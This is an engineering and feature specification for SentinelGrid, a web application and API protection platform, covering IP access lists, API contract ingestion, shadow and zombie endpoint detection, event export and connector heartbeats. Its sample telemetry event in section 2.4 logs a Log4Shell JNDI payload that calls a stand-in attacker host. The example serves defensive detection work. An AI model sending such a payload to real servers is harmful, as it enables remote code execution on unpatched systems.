# SENTINELGRID WAAP // ENTERPRISE ARCHITECTURE & FEATURE SPECIFICATION
**Document ID:** SG-SPEC-WAAP-ENT-2026-V1  
**Classification:** Engineering Specification / Production Architecture  
**Author:** Anup Dhokiya (@anup-dhokiya) - Lead Architect  
**Platform:** SentinelGrid AI-Assisted Web Application & API Protection (WAAP)  
**Target Gateways:** Cloudflare WAF, Akamai Kona/AAP, AWS WAF, Imperva, Datadog ASM, Wallarm  

---

## 1. Executive Summary & Competitive Analysis

SentinelGrid is an enterprise-grade, target-aware Web Application & API Protection (WAAP) platform engineered to protect distributed microservices, APIs, and edge gateways against sophisticated adversarial campaigns, zero-day CVEs, and automated reconnaissance.

Traditional WAFs rely on static regex pattern matching that incurs high CPU latency overhead and produces unacceptable false-positive rates on complex JSON payloads. Modern enterprise WAAP platforms have evolved into multi-layered behavioral and contract-driven systems. Below is an engineering benchmark comparing the market leaders against SentinelGrid's architectural implementation:

| WAAP Capability | Cloudflare WAF | Akamai Kona / AAP | AWS WAF | Imperva Cloud WAF | Datadog ASM | Wallarm WAAP | **SentinelGrid WAAP** |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **Inspection Engine** | Wirefilter Rust AST & Hyperscan | Adaptive Security Engine (ASE) | Aho-Corasick Rule Groups | Dynamic Profiling Engine | In-App libddwaf Tracer Engine | Libdetection AST Context Parser | **Target-Aware Contextual Engine + Libdetection Normalization** |
| **P99 Latency Budget** | < 2.0 ms | < 4.5 ms | < 5.0 ms | < 6.0 ms | < 1.0 ms (In-Process) | < 1.8 ms (Sidecar) | **< 1.25 ms (Local Engine) / < 3.0 ms (Sidecar)** |
| **API Contract Validation** | API Shield (OpenAPI v3) | Positive Security Model (OAS) | API Gateway Request Validator | Automated OAS Discovery & Sync | Trace Span Endpoint Discovery | OpenAPI Contract Drift Detection | **OpenAPI 3.0 / Swagger 2.0 Ingestion + Live Diff** |
| **Shadow API Discovery** | Heuristic Machine Learning | Continuous API Discovery | CloudWatch Access Log Sampling | Cloud SOC Surface Mapper | APM Trace Span Cataloging | Active & Passive Traffic Clustering | **Live Traffic Discovery + Instant Shadow Tagging** |
| **Zombie API Flagging** | Schema Version Deprecation Tag | End-of-Life OAS Monitoring | Manual Tagging | API Catalog Deprecation Flags | Outdated Trace Service Alarms | Deprecated OAS Route Enforcement | **Automated OAS `deprecated: true` -> Zombie Tagging** |
| **IP Access Control** | IP Lists & Geo / ASN | Network Lists (CIDR) | IP Sets (IPv4 / IPv6 CIDR) | Geo & IP Reputation Feeds | Security Signal IP Blacklisting | IP Reputation & CIDR Filter | **Subnet CIDR (IPv4/IPv6) + Single IP Dynamic ACL** |
| **Connector Agility** | Cloudflare Workers | EdgeWorkers & Fastly Compute | CloudFront Lambda@Edge | Cloud Reverse Proxy | In-Process APM Tracers | Nginx / Envoy / eBPF Sidecars | **Nginx (`auth_request` / `mirror`), Python, Node, Go, CF** |
| **Policy Verification** | Rule Staging | Evaluation Mode | Count Metric Mode | Non-Blocking Learning Mode | Security Signal Warning Mode | Shadow Mode Execution | **RFC 8032 Ed25519 Signed Policies + Historical Replay** |

---

## 2. Core Feature Specifications

### 2.1 Domain & Asset Inventory Management

Enterprise security teams manage hundreds of disparate domains, root apex records, internal APIs, and staging subdomains. SentinelGrid provides unified multi-tenant asset management.

#### Architectural Principles:
1. **Hierarchical Isolation:** Each protected asset (e.g. `api.corp.com`, `auth.corp.com`) possesses an isolated SQLite/PostgreSQL tenant workspace with independent policy version trees, endpoint catalogs, and IP rule sets.
2. **State Transition Machine:** Assets transition between `active` (enforcing policy), `monitoring` (passive shadow observation), and `disabled` (bypassed).
3. **Cascading Relational Integrity:** Deleting or decommissioning an asset cleanly cascades across all associated security events, discovered endpoints, and connector heartbeat records.

#### Operational Workflow:
```
                      +-----------------------------+
                      |   Domain Registration API   |
                      |    POST /v1/websites        |
                      +--------------+--------------+
                                     |
                                     v
                      +-----------------------------+
                      |  Provision Isolated Tenant  |
                      |  - Unique Website UUID      |
                      |  - Default Baseline Policy  |
                      |  - Initial Risk Score (0.0) |
                      +--------------+--------------+
                                     |
                                     v
                      +-----------------------------+
                      | Multi-Site Operational HUD  |
                      | - Live Health Status        |
                      | - Active Endpoint Count     |
                      | - Real-Time Shadow Alert    |
                      +-----------------------------+
```

#### REST Control Plane Specification:
* `GET /v1/websites`: Enumerates all protected domains with aggregated counts of total endpoints, shadow APIs, and 24-hour event volumes.
* `POST /v1/websites`: Provision a new domain asset with automated baseline policy assignment.
* `PUT /v1/websites/{website_id}`: Modify domain labels, apex FQDNs, or operational modes.
* `PATCH /v1/websites/{website_id}/toggle`: Instant 1-click toggle between `active` and `disabled`.
* `DELETE /v1/websites/{website_id}`: Safe decommission with cascading referential clean-up.

---

### 2.2 Dynamic IP Access Control Lists (Allowlist / Blocklist / CIDR)

SentinelGrid provides wire-speed IP evaluation executing prior to CPU-intensive regex normalization or payload parsing.

#### Architectural Principles:
1. **Pre-Evaluation Filtering:** IP access control rules execute at Step 0 of `/v1/inspect`. A request from a blocked IP or subnet terminates in `< 0.2ms` without triggering deep regex scanners.
2. **CIDR Subnet Resolution:** Fully compliant with RFC 4632 (IPv4 CIDR) and RFC 4291 (IPv6 addressing). Evaluated via strict prefix tree (trie) bitwise operations.
3. **Allowlist Precedence:** Trusted administrative IP ranges (`action: ALLOW`) bypass security inspection entirely, eliminating false positives on internal scanners and health checkers.
4. **Forensic Audit Logging:** Every IP block generates a dedicated security event with `rule_triggered: IP-BLOCK-LIST`, storing the specific triggering CIDR notation and rule description.

#### Subnet Bitmask Resolution Flow:
```
Incoming Request (Client IP: 198.51.100.89)
                  |
                  v
       +-----------------------+
       |   Parse Client IP     |
       |  ipaddress.ip_address |
       +-----------+-----------+
                   |
                   v
       +-----------------------+
       | Match Against Active  |
       | IP Rules for Website  |
       +-----------+-----------+
             /           \
     Match Found?      No Match
         /                   \
        v                     v
   Action == BLOCK?      Pass to SecurityBrain
   - Return 403          (Payload & CVE Engine)
   - Rule: IP-BLOCK-LIST
   - Latency: < 0.2ms
```

#### REST Control Plane Specification:
* `GET /v1/ip-rules?website_id={id}`: Enumerate active access rules for a domain.
* `POST /v1/ip-rules`: Create an IP rule. Validates strict CIDR/IP syntax (e.g., `10.240.0.0/16`, `2001:db8::/32`, `203.0.113.195`).
* `DELETE /v1/ip-rules/{rule_id}`: Instant revocation of an access rule.

---

### 2.3 API Contract Ingestion & Shadow / Zombie API Discovery

Undocumented ("shadow") APIs and deprecated, unmaintained ("zombie") endpoints represent the primary attack surface exploited in modern API security breaches (OWASP API Security Top 10 API9:2023 - Improper Inventory Management).

#### Architectural Principles:
1. **Contract Ingestion (Positive Security Model):** Ingest OpenAPI 3.0.x / 3.1.x and Swagger 2.0 specifications (JSON or YAML). The engine parses all declared `paths`, `methods`, parameter types, and `deprecated` attributes.
2. **Zombie API Detection:** Routes flagged with `deprecated: true` in the OpenAPI contract are cataloged as `status: zombie` with `risk_level: HIGH`. When traffic strikes a zombie route, SentinelGrid emits an audit warning or challenge verdict (`API-ZOMBIE-DEPRECATED-ACCESS`).
3. **Continuous Passive Discovery:** During live request inspection (`POST /v1/inspect`), SentinelGrid compares `(website_id, path, method)` against the registered catalog. Any route not present in the contract is immediately cataloged as `status: shadow` with `risk_level: MEDIUM`, alerting security teams to rogue endpoints or documentation drift.
4. **Endpoint Fingerprinting:** Normalizes parameterized paths (e.g. `/users/123` -> `/users/{id}`) to prevent endpoint catalog explosion.

#### Contract Validation & Drift Flow:
```
                      +-----------------------------+
                      |   OpenAPI 3.0 Specification |
                      |    (Swagger JSON / YAML)    |
                      +--------------+--------------+
                                     |
                                     v
                      +-----------------------------+
                      |   Ingestion & Schema Parser |
                      |   POST /v1/api-specs/import |
                      +--------------+--------------+
                                     |
                  +------------------+------------------+
                  |                                     |
                  v                                     v
      +-----------------------+             +-----------------------+
      |  Documented Endpoints |             |   Zombie Endpoints    |
      |  status: documented   |             |   deprecated: true    |
      |  risk_level: LOW      |             |   status: zombie      |
      |                       |             |   risk_level: HIGH    |
      +-----------+-----------+             +-----------+-----------+
                  \                                     /
                   \                                   /
                    v                                 v
                +-----------------------------------------+
                |    Live Traffic Inspection Pipeline     |
                |          POST /v1/inspect               |
                +--------------------+--------------------+
                                     |
                           Undocumented Route?
                                     |
                                     v
                        +-------------------------+
                        |     Shadow API Alert    |
                        |     status: shadow      |
                        |     risk_level: MEDIUM  |
                        +-------------------------+
```

#### REST Control Plane Specification:
* `POST /v1/api-specs/import`: Ingests raw OpenAPI specification, returns catalog breakdown (`imported_endpoints_count`, `documented_count`, `zombie_count`).
* `GET /v1/endpoints?website_id={id}&status={documented|shadow|zombie}`: Filterable catalog of the discovered API attack surface.

---

### 2.4 Real-Time Threat Analytics, Live Event Filtering & SIEM Export

Enterprise Security Operations Centers (SOC) require low-latency threat visualization, forensic filtering, and bi-directional SIEM/SOAR data streaming.

#### Architectural Principles:
1. **Multi-Dimensional Filtering:** Query security telemetry across domain, source IP, target URI path, enforcement action (`ALLOW`, `BLOCK`, `CHALLENGE`), OWASP category, and triggered rule identifier.
2. **Dual-Format SIEM Export:**
   - **RFC 4180 CSV:** Standard spreadsheet-compliant stream for compliance audits and executive reporting.
   - **Structured JSON Stream:** Full-fidelity event array containing normalized HTTP headers, attack payloads, CVE references, and millisecond execution latencies.
3. **Forensic Traceability:** Every blocked or challenged event generates a cryptographic UUIDv4 `event_id` returned in the HTTP response header (`X-SentinelGrid-Event-ID`), enabling users to cross-reference customer support tickets directly against SOC logs.

#### Telemetry Schema Attributes:
```json
{
  "event_id": "ev-3f9a81bc",
  "website_id": "site-production-api",
  "timestamp": "2026-11-02T13:10:00.000000+00:00",
  "client_ip": "198.51.100.23",
  "method": "POST",
  "path": "/api/v1/auth/token",
  "action": "BLOCK",
  "risk_score": 100.0,
  "rule_triggered": "CVE-2021-44228-LOG4J",
  "owasp_category": "A06:Vulnerable and Outdated Components",
  "details": "CVE: CVE-2021-44228 | Headers: Mozilla/5.0 | Payload: ${jndi:ldap://attacker.com/exploit}",
  "execution_latency_ms": 1.12
}
```

#### REST Control Plane Specification:
* `GET /v1/events`: Paginated query endpoint supporting `website_id`, `client_ip`, `path`, `action`, `limit`, and `offset`.
* `GET /v1/events/export?format=csv|json`: Streaming download with Content-Disposition headers for SIEM data pipelines.

---

### 2.5 Connector Health & Heartbeat Monitoring

Heterogeneous edge deployments require active health monitoring to prevent silent blindspots or unmonitored ingress points.

#### Architectural Principles:
1. **Active Heartbeat Beacon:** Every connected agent (Nginx sub-request hook, ASGI middleware, Express plug-in, Envoy sidecar) periodically transmits a 30-second heartbeat beacon to `POST /v1/connectors/heartbeat`.
2. **Dynamic Liveness Calculation:** The control plane compares `now()` against `last_heartbeat`. If `delta > 90 seconds`, the connector transitions automatically to `offline` / `degraded`, triggering an alert on the SOC dashboard.
3. **Latency Benchmarking:** Connectors report local execution latency (`latency_ms`), alerting administrators to network bottlenecks between edge proxies and the SentinelGrid inspection core.

#### REST Control Plane Specification:
* `GET /v1/connectors?website_id={id}`: Enumerate registered connectors with calculated health state (`online` vs `offline`) and measured round-trip latencies.
* `POST /v1/connectors/heartbeat`: Register or refresh connector status (`connector_name`, `connector_type`, `latency_ms`).

---

## 3. Security Verification & Compliance

SentinelGrid's feature matrix has been engineered to adhere to strict regulatory compliance standards:
* **PCI-DSS 4.0 Requirement 6.4.2:** Automated technical solution for public-facing web applications that continually detects and prevents web-based attacks.
* **NIST SP 800-207 (Zero Trust Architecture):** Continuous validation of every incoming request vector, regardless of network origin.
* **OWASP Top 10:2021 & OWASP API Security Top 10:2023:** Full signature and behavioral coverage across SQLi, Broken Object Level Authorization (BOLA), SSRF, and Unauthenticated Shadow APIs.
